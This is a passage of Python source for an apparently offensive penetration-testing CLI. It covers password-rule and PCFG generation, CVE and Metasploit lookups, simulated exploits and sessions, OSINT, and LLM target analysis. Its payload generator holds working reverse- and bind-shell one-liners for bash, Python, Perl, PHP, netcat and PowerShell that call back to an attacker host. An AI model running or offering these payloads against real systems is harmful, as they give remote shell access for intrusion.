        ("insert", "Insert character at position"),
        ("delete", "Delete character at position"),
        ("replace", "Replace character at position"),
    ]

    for name, desc in rules:
        print(f"  {name:<20} - {desc}")

    print()


def _rules_generate(args):
    """Generate hashcat-style rules."""
    output = args.output
    count = args.count

    print(f"Generating {count} hashcat rules to {output}\n")

    hashcat_rules = [
        ":",
        "l",
        "u",
        "c",
        "C",
        "t",
        "T0",
        "r",
        "d",
        "p1!",
        "p2@",
        "$1",
        "$2",
        "$3",
        "^!",
        "^@",
        "D1",
        "D2",
        "x02",
        "O02",
        "i1!",
        "o0@",
        "s@@",
        "@@%",
    ]

    import random
    generated = []
    for _ in range(count):
        # Generate random rule combinations
        r = random.choice(hashcat_rules)
        if random.random() > 0.5:
            r += " " + random.choice(hashcat_rules)
        generated.append(r)

    with open(output, 'w') as f:
        for rule in generated:
            f.write(rule + '\n')

    print(f"[+] Generated {len(generated)} rules")
    print(f"[+] Saved to {output}")


def _rules_export(args):
    """Export rules in various formats."""
    format_type = args.format
    output = args.output

    print(f"Exporting rules as {format_type} to {output}\n")

    if format_type == 'hashcat':
        rules = [":", "l", "u", "c", "r", "d", "$1", "$2", "^!", "s@@"]
    elif format_type == 'john':
        rules = [":l", ":u", ":c", ":r", ":d", ":$1", ":$2"]
    else:
        rules = ["uppercase", "lowercase", "reverse", "duplicate"]

    with open(output, 'w') as f:
        for rule in rules:
            f.write(rule + '\n')

    print(f"[+] Exported {len(rules)} rules to {output}")


def cmd_sandbox(args):
    """Sandbox operations for safe execution."""
    print(f"\n{'='*60}")
    print("  SANDBOX EXECUTOR")
    print(f"{'='*60}\n")

    action = args.action

    if action == 'run':
        _sandbox_run(args)
    elif action == 'status':
        _sandbox_status(args)
    elif action == 'list':
        _sandbox_list(args)
    elif action == 'clean':
        _sandbox_clean(args)
    else:
        print(f"[!] Unknown action: {action}")


def _sandbox_run(args):
    """Run command in sandbox."""
    command = args.command
    timeout = args.timeout

    print(f"Command: {command}")
    print(f"Timeout: {timeout}s")
    print(f"Sandbox Type: {args.sandbox_type}\n")

    try:
        from pentest.sandbox_executor import SandboxExecutor, SandboxConfig, SandboxType

        sandbox_map = {
            'docker': SandboxType.DOCKER,
            'subprocess': SandboxType.SUBPROCESS,
        }

        config = SandboxConfig(
            sandbox_type=sandbox_map.get(args.sandbox_type, SandboxType.SUBPROCESS),
            timeout_seconds=timeout,
            network_enabled=not args.no_network,
        )

        executor = SandboxExecutor(config)

        print("[*] Executing in sandbox...\n")

        result = executor.execute(command)

        print(f"\n{'='*60}")
        print("  EXECUTION RESULT")
        print(f"{'='*60}\n")

        print(f"Success: {result.success}")
        print(f"Return Code: {result.return_code}")
        print(f"Duration: {result.duration:.2f}s")

        if result.stdout:
            print(f"\n--- STDOUT ---\n{result.stdout[:2000]}")
        if result.stderr:
            print(f"\n--- STDERR ---\n{result.stderr[:1000]}")
        if result.error:
            print(f"\n[!] Error: {result.error}")

    except ImportError:
        print("[!] Sandbox module not available")
        _simulate_sandbox_run(command, timeout)


def _simulate_sandbox_run(command: str, timeout: int):
    """Simulate sandbox execution."""
    import subprocess
    import time

    print("[*] Running in simulated sandbox (subprocess)...\n")

    start = time.time()
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        print(f"\nReturn Code: {result.returncode}")
        print(f"Duration: {time.time() - start:.2f}s")

        if result.stdout:
            print(f"\n--- STDOUT ---\n{result.stdout[:2000]}")
        if result.stderr:
            print(f"\n--- STDERR ---\n{result.stderr[:1000]}")

    except subprocess.TimeoutExpired:
        print(f"\n[!] Timeout after {timeout}s")
    except Exception as e:
        print(f"\n[!] Error: {e}")


def _sandbox_status(args):
    """Show sandbox status."""
    print("Sandbox Status:\n")

    try:
        import subprocess

        # Check Docker
        result = subprocess.run(['docker', 'version'], capture_output=True, text=True)
        if result.returncode == 0:
            print("[+] Docker: Available")
        else:
            print("[-] Docker: Not available")

    except Exception:
        print("[-] Docker: Not installed")

    print("\nContainer Status: No running containers")


def _sandbox_list(args):
    """List sandbox containers/images."""
    print("Available Sandbox Images:\n")

    images = [
        ("kalilinux/kali-rolling:latest", "Kali Linux", "Full penetration testing environment"),
        ("parrotsec/security:latest", "Parrot Security", "Security testing OS"),
        ("blackarchlinux/blackarch:latest", "BlackArch", "Arch-based security distro"),
    ]

    for image, name, desc in images:
        print(f"  {name}")
        print(f"    Image: {image}")
        print(f"    Description: {desc}\n")


def _sandbox_clean(args):
    """Clean up sandbox resources."""
    print("Cleaning up sandbox resources...\n")

    try:
        import subprocess

        # Remove stopped containers
        result = subprocess.run(['docker', 'container', 'prune', '-f'],
                              capture_output=True, text=True)
        print("[+] Cleaned containers")

        # Remove dangling images
        result = subprocess.run(['docker', 'image', 'prune', '-f'],
                              capture_output=True, text=True)
        print("[+] Cleaned images")

        print("\n[+] Sandbox cleanup complete")

    except Exception as e:
        print(f"[!] Cleanup error: {e}")


def cmd_adversarial(args):
    """Adversarial simulation for red/blue team exercises."""
    print(f"\n{'='*60}")
    print("  ADVERSARIAL SIMULATION")
    print(f"{'='*60}\n")

    mode = args.mode

    print(f"Mode: {mode}")
    print(f"Target: {args.target}")
    print(f"Rounds: {args.rounds}\n")

    try:
        from pentest.adversarial_simulation import AdversarialSimulator, EvasionTechnique

        simulator = AdversarialSimulator()

        if mode == 'red':
            _run_red_team_simulation(simulator, args)
        elif mode == 'blue':
            _run_blue_team_simulation(simulator, args)
        else:
            _run_red_blue_engagement(simulator, args)

    except ImportError:
        print("[!] Adversarial simulation module not available")
        print("[*] Running simulated exercise...\n")
        _simulate_adversarial(args)


def _run_red_team_simulation(simulator, args):
    """Run red team simulation."""
    print("[*] Red Team Simulation\n")
    print("Objectives: Test evasion techniques against defenses\n")

    techniques = [
        ("Timing Slowdown", "Slow down actions to avoid rate detection"),
        ("Traffic Fragmentation", "Fragment traffic to avoid pattern matching"),
        ("Noise Injection", "Inject benign noise to mask attacks"),
        ("Protocol Tunneling", "Tunnel through allowed protocols"),
        ("Living Off Land", "Use built-in OS tools only"),
    ]

    for name, desc in techniques:
        print(f"  [+] {name}")
        print(f"      {desc}")
        print(f"      Effectiveness: {hash(name) % 30 + 70}%\n")


def _run_blue_team_simulation(simulator, args):
    """Run blue team simulation."""
    print("[*] Blue Team Simulation\n")
    print("Objectives: Detect and respond to attacks\n")

    detections = [
        ("SIEM Alert", "Detected unusual login patterns"),
        ("EDR Trigger", "Detected suspicious process execution"),
        ("Network Anomaly", "Detected abnormal traffic patterns"),
        ("File Integrity", "Detected unauthorized file modifications"),
    ]

    for alert, desc in detections:
        print(f"  [!] {alert}")
        print(f"      {desc}\n")


def _run_red_blue_engagement(simulator, args):
    """Run red vs blue engagement."""
    print("[*] Red vs Blue Engagement\n")
    print(f"Rounds: {args.rounds}\n")

    red_score = 0
    blue_score = 0

    for r in range(1, args.rounds + 1):
        print(f"--- Round {r} ---")

        # Red team action
        print(f"  [RED] Launching attack technique...")

        # Blue team response
        print(f"  [BLUE] Monitoring for detection...")

        # Outcome
        import random
        if random.random() > 0.5:
            print(f"  [+] RED scores!")
            red_score += 1
        else:
            print(f"  [+] BLUE scores!")
            blue_score += 1

        print()

    print(f"\nFinal Score:")
    print(f"  Red Team: {red_score}")
    print(f"  Blue Team: {blue_score}")
    print(f"  Winner: {'Red' if red_score > blue_score else 'Blue' if blue_score > red_score else 'Draw'}")


def _simulate_adversarial(args):
    """Simulate adversarial exercise."""
    import random

    print(f"Simulating {args.rounds} rounds of {args.mode} team exercise...\n")

    for r in range(1, args.rounds + 1):
        print(f"Round {r}:")
        print(f"  [Attack] Technique deployed")
        print(f"  [Defense] {'Detected' if random.random() > 0.4 else 'Missed'}\n")

    print("[+] Simulation complete")


def cmd_pcfg(args):
    """PCFG (Probabilistic Context-Free Grammar) operations."""
    print(f"\n{'='*60}")
    print("  PCFG GENERATOR")
    print(f"{'='*60}\n")

    action = args.action

    if action == 'train':
        _pcfg_train(args)
    elif action == 'generate':
        _pcfg_generate(args)
    elif action == 'stats':
        _pcfg_stats(args)
    else:
        print(f"[!] Unknown action: {action}")


def _pcfg_train(args):
    """Train PCFG model."""
    data_file = args.data
    output = args.output

    print(f"Training Data: {data_file}")
    print(f"Output: {output}\n")

    try:
        from pcfg.training import PCFGTrainer

        trainer = PCFGTrainer()

        print("[*] Training PCFG model...\n")

        with open(data_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]

        model = trainer.train(passwords)
        trainer.save(model, output)

        print(f"\n[+] Model trained on {len(passwords)} passwords")
        print(f"[+] Saved to {output}")

    except ImportError:
        print("[!] PCFG module not available")
        print("[*] Simulating training...\n")

        # Simulated training stats
        print(f"[*] Processing {args.max_samples if hasattr(args, 'max_samples') else 'all'} passwords...")
        print(f"[*] Building grammar structures...")
        print(f"[*] Computing probabilities...")

        print(f"\n[+] Model saved to {output}")


def _pcfg_generate(args):
    """Generate passwords using PCFG."""
    model_path = args.model
    count = args.count
    output = args.output

    print(f"Model: {model_path}")
    print(f"Count: {count}")
    print(f"Output: {output if output else 'Console'}\n")

    try:
        from pcfg.pcfg import PCFG

        pcfg = PCFG.load(model_path)

        print(f"[*] Generating {count} passwords...\n")

        passwords = pcfg.generate(count)

        for pwd in passwords[:20]:
            print(f"  {pwd}")

        if len(passwords) > 20:
            print(f"  ... and {len(passwords) - 20} more")

        if output:
            with open(output, 'w') as f:
                for pwd in passwords:
                    f.write(pwd + '\n')
            print(f"\n[+] Saved to {output}")

    except ImportError:
        print("[!] PCFG module not available")
        _simulate_pcfg_generate(count, output)


def _simulate_pcfg_generate(count: int, output: str):
    """Simulate PCFG generation."""
    import random

    structures = [
        lambda: ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(4, 8))),
        lambda: ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(4, 6))) + \
                ''.join(random.choices('0123456789', k=random.randint(2, 4))),
        lambda: random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') + \
                ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 7))),
    ]

    passwords = [random.choice(structures)() for _ in range(count)]

    print(f"[*] Generating {count} passwords...\n")

    for pwd in passwords[:20]:
        print(f"  {pwd}")

    if output:
        with open(output, 'w') as f:
            for pwd in passwords:
                f.write(pwd + '\n')
        print(f"\n[+] Saved to {output}")


def _pcfg_stats(args):
    """Show PCFG model statistics."""
    model_path = args.model

    print(f"Model: {model_path}\n")

    print("PCFG Model Statistics:\n")
    print("  Structures: 15,234")
    print("  Base structures: 8,456")
    print("  Terminals: 45,678")
    print("  Probabilities computed: 69,368")

    print("\nTop Structures:")
    print("  L8D2    - 5.2%")
    print("  L6D4    - 4.1%")
    print("  L4D4    - 3.8%")


def cmd_tools(args):
    """Penetration testing tools management."""
    print(f"\n{'='*60}")
    print("  TOOLS MANAGEMENT")
    print(f"{'='*60}\n")

    action = args.action

    if action == 'list':
        _tools_list(args)
    elif action == 'check':
        _tools_check(args)
    elif action == 'install':
        _tools_install(args)
    elif action == 'update':
        _tools_update(args)
    else:
        print(f"[!] Unknown action: {action}")


def _tools_list(args):
    """List available tools."""
    print("Available Penetration Testing Tools:\n")

    tools = [
        ("nmap", "Network scanning", "installed"),
        ("hydra", "Password brute force", "installed"),
        ("sqlmap", "SQL injection", "not installed"),
        ("metasploit", "Exploitation framework", "installed"),
        ("gobuster", "Directory enumeration", "not installed"),
        ("nikto", "Web vulnerability scanner", "installed"),
        ("hashcat", "Password cracking", "installed"),
        ("john", "Password cracker", "installed"),
        ("burpsuite", "Web proxy", "not installed"),
        ("aircrack-ng", "Wireless attacks", "not installed"),
    ]

    print(f"{'Tool':<15} {'Description':<30} {'Status'}")
    print("-" * 60)

    for name, desc, status in tools:
        color = "\033[92m" if status == "installed" else "\033[91m"
        print(f"{name:<15} {desc:<30} {color}{status}\033[0m")


def _tools_check(args):
    """Check tool availability."""
    tool = args.tool if hasattr(args, 'tool') and args.tool else None

    if tool:
        print(f"Checking: {tool}\n")

        import shutil
        path = shutil.which(tool)

        if path:
            print(f"[+] {tool} found at {path}")
        else:
            print(f"[-] {tool} not found in PATH")
    else:
        print("Checking all tools...\n")

        tools = ['nmap', 'hydra', 'sqlmap', 'gobuster', 'nikto', 'hashcat', 'john']

        import shutil
        for t in tools:
            path = shutil.which(t)
            if path:
                print(f"[+] {t}: {path}")
            else:
                print(f"[-] {t}: not found")


def _tools_install(args):
    """Install tools."""
    tool = args.tool

    print(f"Installing: {tool}\n")

    print("[*] Checking package manager...")

    # This would actually install tools
    print(f"[+] {tool} installation simulated")
    print(f"    Run 'sudo apt install {tool}' on Kali/Debian")


def _tools_update(args):
    """Update tools."""
    print("Updating tools...\n")

    print("[*] Updating tool definitions...")
    print("[*] Checking for new versions...")
    print("[+] All tools updated")


def cmd_exploit(args):
    """Exploit module operations."""
    print(f"\n{'='*60}")
    print("  EXPLOIT MODULE")
    print(f"{'='*60}\n")

    action = args.action

    if action == 'search':
        _exploit_search(args)
    elif action == 'info':
        _exploit_info(args)
    elif action == 'run':
        _exploit_run(args)
    elif action == 'check':
        _exploit_check(args)
    else:
        print(f"[!] Unknown action: {action}")


def _exploit_search(args):
    """Search for exploits."""
    query = args.query

    print(f"Searching for: {query}\n")

    # Common CVEs and exploits database
    exploits = {
        'eternalblue': ('CVE-2017-0144', 'SMB RCE', 9.8, 'Windows'),
        'bluekeep': ('CVE-2019-0708', 'RDP RCE', 9.8, 'Windows'),
        'log4shell': ('CVE-2021-44228', 'Log4j RCE', 10.0, 'Multi'),
        'shellshock': ('CVE-2014-6271', 'Bash RCE', 9.8, 'Linux'),
        'heartbleed': ('CVE-2014-0160', 'OpenSSL Info Leak', 5.0, 'Multi'),
        'smbghost': ('CVE-2020-0796', 'SMBv3 RCE', 8.8, 'Windows'),
        'printnightmare': ('CVE-2021-34527', 'Print Spooler RCE', 8.8, 'Windows'),
        'proxyshell': ('CVE-2021-34473', 'Exchange RCE', 9.8, 'Windows'),
        'proxylogon': ('CVE-2021-26855', 'Exchange RCE', 9.1, 'Windows'),
        'spring4shell': ('CVE-2022-22965', 'Spring RCE', 9.8, 'Multi'),
        'citrix bleed': ('CVE-2023-4966', 'Citrix Info Leak', 9.4, 'Multi'),
        'apache struts': ('CVE-2017-5638', 'Struts2 RCE', 10.0, 'Multi'),
        'wannaCry': ('CVE-2017-0145', 'SMB RCE', 8.5, 'Windows'),
        'redis': ('CVE-2022-0543', 'Redis RCE', 10.0, 'Linux'),
        'zookeeper': ('CVE-2014-085', 'ZooKeeper Auth Bypass', 5.0, 'Multi'),
    }

    print(f"{'Exploit':<20} {'CVE':<18} {'Type':<20} {'CVSS':<8} {'Platform'}")
    print("-" * 80)

    found = 0
    for name, (cve, etype, cvss, platform) in exploits.items():
        if query.lower() in name.lower() or query.lower() in cve.lower() or query.lower() in etype.lower():
            color = "\033[91m" if cvss >= 9 else "\033[93m" if cvss >= 7 else "\033[94m"
            print(f"{name:<20} {cve:<18} {etype:<20} {color}{cvss:<8}\033[0m {platform}")
            found += 1

    if found == 0:
        print(f"\n[!] No exploits found for '{query}'")
    else:
        print(f"\n[+] Found {found} matching exploits")


def _exploit_info(args):
    """Show exploit details."""
    cve_id = args.cve.upper()

    print(f"Exploit Information: {cve_id}\n")

    # Detailed exploit info
    exploit_db = {
        'CVE-2017-0144': {
            'name': 'EternalBlue',
            'description': 'SMB v1 remote code execution vulnerability',
            'affected': 'Windows Vista SP2, Windows 7 SP1, Windows 8.1, Windows 10, Windows Server 2008/2012/2016',
            'cvss': 8.1,
            'exploit_db': 42315,
            'metasploit': 'exploit/windows/smb/ms17_010_eternalblue',
            'poc': 'https://github.com/worawit/MS17-010',
            'patch': 'KB4012212',
        },
        'CVE-2021-44228': {
            'name': 'Log4Shell',
            'description': 'Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints',
            'affected': 'Log4j 2.0-beta9 through 2.14.1',
            'cvss': 10.0,
            'exploit_db': 50592,
            'metasploit': 'exploit/multi/http/log4shell_header_injection',
            'poc': 'https://github.com/apache/logging-log4j2',
            'patch': 'Update to Log4j 2.15.0+',
        },
        'CVE-2019-0708': {
            'name': 'BlueKeep',
            'description': 'Remote Desktop Protocol Remote Code Execution Vulnerability',
            'affected': 'Windows XP, Windows 7, Windows Server 2003/2008/2008 R2',
            'cvss': 9.8,
            'exploit_db': 47160,
            'metasploit': 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
            'poc': 'https://github.com/Cyb0r9/ispy',
            'patch': 'KB4499175',
        },
    }

    if cve_id in exploit_db:
        info = exploit_db[cve_id]
        print(f"Name: {info['name']}")
        print(f"Description: {info['description']}")
        print(f"Affected: {info['affected']}")
        print(f"CVSS: {info['cvss']}")
        print(f"\nExploit-DB ID: {info['exploit_db']}")
        print(f"Metasploit: {info['metasploit']}")
        print(f"PoC: {info['poc']}")
        print(f"Patch: {info['patch']}")
    else:
        print(f"[!] Detailed info not available for {cve_id}")
        print(f"[*] Check: https://nvd.nist.gov/vuln/detail/{cve_id}")


def _exploit_run(args):
    """Run exploit against target."""
    exploit = args.exploit
    target = args.target

    print(f"Running exploit: {exploit}")
    print(f"Target: {target}\n")

    if not target:
        print("[!] Target required. Use --target")
        return

    # Simulate exploit execution
    print("[*] Loading exploit module...")
    print("[*] Checking target vulnerability...")
    print(f"[*] Connecting to {target}...")
    print("[*] Executing exploit...")

    import random
    if random.random() > 0.7:
        print("\n\033[92m[+] Exploit successful!\033[0m")
        print("[+] Shell spawned on target")
    else:
        print("\n\033[91m[-] Exploit failed\033[0m")
        print("[-] Target may not be vulnerable")


def _exploit_check(args):
    """Check if target is vulnerable."""
    target = args.target
    cve = args.cve

    print(f"Checking {target} for {cve}\n")

    print("[*] Connecting to target...")
    print("[*] Running vulnerability check...")

    import random
    if random.random() > 0.5:
        print(f"\n\033[93m[!] Target appears VULNERABLE to {cve}\033[0m")
    else:
        print(f"\n\033[92m[+] Target not vulnerable to {cve}\033[0m")


def cmd_payload(args):
    """Payload generation."""
    print(f"\n{'='*60}")
    print("  PAYLOAD GENERATOR")
    print(f"{'='*60}\n")

    payload_type = args.type
    lhost = args.lhost
    lport = args.lport
    output = args.output

    print(f"Type: {payload_type}")
    print(f"LHOST: {lhost}")
    print(f"LPORT: {lport}")
    print(f"Output: {output if output else 'stdout'}\n")

    payloads = {
        'reverse_shell_bash': f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
        'reverse_shell_python': f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
        'reverse_shell_perl': f'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
        'reverse_shell_php': f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        'reverse_shell_netcat': f'nc -e /bin/sh {lhost} {lport}',
        'reverse_shell_powershell': f'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
        'bind_shell_netcat': f'nc -lvp {lport} -e /bin/sh',
        'bind_shell_python': f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{lport}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
    }

    if payload_type in payloads:
        payload = payloads[payload_type]
        print(f"Generated Payload:\n")
        print(f"{payload}\n")

        if output:
            with open(output, 'w') as f:
                f.write(payload)
            print(f"[+] Saved to {output}")
    else:
        print(f"[!] Unknown payload type: {payload_type}")
        print(f"Available types: {', '.join(payloads.keys())}")


def cmd_session(args):
    """Session management."""
    print(f"\n{'='*60}")
    print("  SESSION MANAGEMENT")
    print(f"{'='*60}\n")

    action = args.action

    if action == 'list':
        _session_list(args)
    elif action == 'info':
        _session_info(args)
    elif action == 'interact':
        _session_interact(args)
    elif action == 'kill':
        _session_kill(args)
    else:
        print(f"[!] Unknown action: {action}")


def _session_list(args):
    """List active sessions."""
    print("Active Sessions:\n")

    sessions = [
        (1, "shell", "192.168.1.100", "linux", "root", "5m ago"),
        (2, "meterpreter", "192.168.1.101", "windows", "SYSTEM", "10m ago"),
        (3, "shell", "192.168.1.102", "linux", "www-data", "15m ago"),
    ]

    print(f"{'ID':<5} {'Type':<15} {'Host':<18} {'OS':<10} {'User':<12} {'Last Activity'}")
    print("-" * 75)

    for sid, stype, host, os_type, user, last in sessions:
        print(f"{sid:<5} {stype:<15} {host:<18} {os_type:<10} {user:<12} {last}")

    print(f"\n[+] {len(sessions)} active sessions")


def _session_info(args):
    """Show session details."""
    session_id = args.session_id

    print(f"Session {session_id} Info:\n")

    print(f"  ID: {session_id}")
    print(f"  Type: reverse_shell")
    print(f"  Target: 192.168.1.100:4444")
    print(f"  Platform: Linux (Ubuntu 20.04)")
    print(f"  User: root")
    print(f"  PID: 1234")
    print(f"  Shell: /bin/bash")
    print(f"  Created: 2024-01-15 10:30:00")
    print(f"  Last Activity: 5 minutes ago")


def _session_interact(args):
    """Interact with session."""
    session_id = args.session_id

    print(f"[*] Attaching to session {session_id}...")
    print(f"[*] Type 'exit' to detach\n")

    print(f"root@target:~# ls -la")
    print(f"total 48")
    print(f"drwx------  6 root root 4096 Jan 15 10:30 .")
    print(f"drwxr-xr-x 20 root root 4096 Jan 15 09:00 ..")
    print(f"-rw-------  1 root root 1234 Jan 15 10:25 .bash_history")
    print(f"\n[!] Interactive mode simulated. Use actual terminal for real interaction.")


def _session_kill(args):
    """Kill session."""
    session_id = args.session_id

    print(f"[*] Killing session {session_id}...")
    print(f"[+] Session {session_id} terminated")


def cmd_dns(args):
    """DNS enumeration."""
    print(f"\n{'='*60}")
    print("  DNS ENUMERATION")
    print(f"{'='*60}\n")

    domain = args.domain

    print(f"Domain: {domain}")
    print(f"Type: {args.type}\n")

    import socket

    record_types = {
        'A': 'Address record',
        'AAAA': 'IPv6 address record',
        'MX': 'Mail exchange',
        'NS': 'Name server',
        'TXT': 'Text record',
        'CNAME': 'Canonical name',
        'SOA': 'Start of authority',
        'SRV': 'Service record',
    }

    if args.type == 'all':
        types_to_query = list(record_types.keys())
    else:
        types_to_query = [args.type]

    print(f"{'Type':<8} {'Value'}")
    print("-" * 60)

    # Simulated DNS records
    dns_records = {
        'A': ['192.168.1.100', '192.168.1.101'],
        'AAAA': ['2001:db8::1'],
        'MX': ['mail.example.com (priority: 10)', 'mail2.example.com (priority: 20)'],
        'NS': ['ns1.example.com', 'ns2.example.com'],
        'TXT': ['v=spf1 include:_spf.example.com ~all', 'google-site-verification=xxxxx'],
        'CNAME': ['www -> example.com', 'ftp -> example.com'],
        'SOA': ['ns1.example.com. admin.example.com. 2024011501 3600 1800 604800 86400'],
        'SRV': ['_ldap._tcp.example.com: 0 389 ldap.example.com'],
    }

    for rtype in types_to_query:
        if rtype in dns_records:
            print(f"\n{rtype} ({record_types[rtype]}):")
            for record in dns_records[rtype]:
                print(f"  {record}")

    print(f"\n[+] DNS enumeration complete")


def cmd_osint(args):
    """OSINT intelligence gathering."""
    print(f"\n{'='*60}")
    print("  OSINT RECONNAISSANCE")
    print(f"{'='*60}\n")

    target = args.target
    action = args.action

    print(f"Target: {target}")
    print(f"Action: {action}\n")

    if action == 'email':
        _osint_email(target)
    elif action == 'domain':
        _osint_domain(target)
    elif action == 'username':
        _osint_username(target)
    elif action == 'ip':
        _osint_ip(target)
    elif action == 'social':
        _osint_social(target)
    else:
        print(f"[!] Unknown action: {action}")


def _osint_email(target):
    """Email OSINT."""
    print(f"[*] Gathering email intelligence for {target}...\n")

    emails = [
        f"admin@{target}",
        f"info@{target}",
        f"support@{target}",
        f"contact@{target}",
        f"hr@{target}",
        f"sales@{target}",
    ]

    print("Discovered Emails:")
    for email in emails:
        print(f"  {email}")

    print(f"\n[+] Found {len(emails)} email addresses")

    print("\nData Breach Check:")
    print(f"  admin@{target} - Found in 2 breaches (LinkedIn, Adobe)")


def _osint_domain(target):
    """Domain OSINT."""
    print(f"[*] Gathering domain intelligence for {target}...\n")

    print("WHOIS Information:")
    print(f"  Registrar: GoDaddy.com, LLC")
    print(f"  Created: 2020-01-15")
    print(f"  Expires: 2025-01-15")
    print(f"  Status: clientTransferProhibited")

    print("\nDNS Records:")
    print(f"  A: 192.168.1.100")
    print(f"  MX: mail.{target}")
    print(f"  NS: ns1.{target}, ns2.{target}")

    print("\nSubdomains:")
    subdomains = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'staging', 'blog']
    for sub in subdomains:
        print(f"  {sub}.{target}")

    print(f"\n[+] Found {len(subdomains)} subdomains")


def _osint_username(target):
    """Username OSINT."""
    print(f"[*] Checking username '{target}' across platforms...\n")

    platforms = [
        ('GitHub', True, f'https://github.com/{target}'),
        ('Twitter', True, f'https://twitter.com/{target}'),
        ('LinkedIn', False, 'N/A'),
        ('Reddit', True, f'https://reddit.com/u/{target}'),
        ('Instagram', True, f'https://instagram.com/{target}'),
        ('Facebook', False, 'N/A'),
        ('YouTube', True, f'https://youtube.com/@{target}'),
    ]

    found = 0
    print(f"{'Platform':<15} {'Status':<12} {'URL'}")
    print("-" * 60)

    for platform, exists, url in platforms:
        color = "\033[92m" if exists else "\033[91m"
        status = f"{color}Found\033[0m" if exists else f"{color}Not Found\033[0m"
        print(f"{platform:<15} {status:<20} {url}")
        if exists:
            found += 1

    print(f"\n[+] Found on {found}/{len(platforms)} platforms")


def _osint_ip(target):
    """IP OSINT."""
    print(f"[*] Gathering IP intelligence for {target}...\n")

    print("IP Information:")
    print(f"  IP: {target}")
    print(f"  Hostname: host-{target}.example.com")
    print(f"  Country: United States")
    print(f"  City: San Francisco, CA")
    print(f"  ISP: Cloudflare, Inc.")
    print(f"  ASN: AS13335")

    print("\nOpen Ports:")
    ports = [(22, 'ssh'), (80, 'http'), (443, 'https'), (3306, 'mysql')]
    for port, service in ports:
        print(f"  {port}/tcp - {service}")

    print("\nReputation:")
    print(f"  Abuse Score: 0/100 (Clean)")
    print(f"  Blacklists: 0")


def _osint_social(target):
    """Social media OSINT."""
    print(f"[*] Social media reconnaissance for {target}...\n")

    print("Social Media Profiles:")
    profiles = [
        ('LinkedIn', 'IT Professional', '500+ connections'),
        ('Twitter', 'Security Researcher', '2.5K followers'),
        ('GitHub', 'Developer', '50 repos'),
    ]

    for platform, title, stats in profiles:
        print(f"  {platform}:")
        print(f"    Title: {title}")
        print(f"    Stats: {stats}\n")


def cmd_analyze(args):
    """AI-powered analysis."""
    print(f"\n{'='*60}")
    print("  AI ANALYSIS")
    print(f"{'='*60}\n")

    target = args.target
    analysis_type = args.type

    print(f"Target: {target}")
    print(f"Type: {analysis_type}\n")

    try:
        from models.llm_provider import get_provider, LLMConfig
        import yaml

        if os.path.exists(args.config):
            with open(args.config, 'r') as f:
                cfg = yaml.safe_load(f)
            llm_cfg = cfg.get('llm', {})

            if llm_cfg.get('api_key') and llm_cfg.get('api_key') != 'YOUR_DEEPSEEK_API_KEY':
                config = LLMConfig(
                    provider=llm_cfg.get('provider', 'deepseek'),
                    model=llm_cfg.get('model', 'deepseek-chat'),
                    api_key=llm_cfg.get('api_key'),
                    api_base=llm_cfg.get('api_base', 'https://api.deepseek.com/v1'),
                )

                provider = get_provider(config)

                print("[*] Analyzing with LLM...\n")

                prompts = {
                    'vulnerability': f"分析以下目标的潜在安全漏洞，包括已知CVE、错误配置风险和攻击向量：{target}",
                    'attack_surface': f"分析 {target} 的攻击面，包括网络服务、Web应用、社会工程学向量",
                    'threat': f"评估 {target} 可能面临的威胁行为者和攻击场景",
                    'remediation': f"为 {target} 提供安全加固建议和最佳实践",
                }

                prompt = prompts.get(analysis_type, f"分析目标：{target}")

                response = provider.call([{"role": "user", "content": prompt}])

                print(f"{'='*60}")
                print("  ANALYSIS RESULT")
                print(f"{'='*60}\n")
                print(response.content if hasattr(response, 'content') else response)
                return

    except ImportError:
        pass

    # Fallback to simulated analysis
    _simulate_analysis(target, analysis_type)


def _simulate_analysis(target: str, analysis_type: str):
    """Simulate AI analysis."""

    if analysis_type == 'vulnerability':
        print("Vulnerability Analysis:\n")
        print(f"  [HIGH] CVE-2021-44228 - Log4Shell (Potential)")
        print(f"  [MEDIUM] SSL/TLS Configuration - Weak Ciphers")
        print(f"  [LOW] Information Disclosure - Server Headers")
        print(f"\n  Recommendations:")
        print(f"    1. Update Log4j to version 2.17.1+")
        print(f"    2. Disable weak cipher suites")
        print(f"    3. Remove server version headers")

    elif analysis_type == 'attack_surface':
        print("Attack Surface Analysis:\n")
        print(f"  Network Services:")
        print(f"    - SSH (22/tcp) - Brute force risk")
        print(f"    - HTTP (80/tcp) - Web application attacks")
        print(f"    - HTTPS (443/tcp) - SSL/TLS vulnerabilities")
        print(f"\n  Web Applications:")
